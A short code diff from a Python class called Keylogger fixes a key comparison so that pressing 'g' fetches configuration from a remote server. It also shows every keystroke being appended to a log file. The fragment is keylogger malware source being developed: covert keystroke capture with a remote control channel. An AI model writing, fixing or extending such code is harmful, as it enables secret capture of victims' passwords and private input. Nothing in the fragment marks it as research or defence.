@@ -16,7 +16,7 @@ class Keylogger(Thread):
     def onPress(self, key):
         if self.__config.debug:
             print(key, end='')
-        if key == 'g':
+        if key.char == 'g':
             self.__communication.getConfigFromServer()
         Util.fileOut(self.__config.logPath + self.__config.logFileName, key)
             
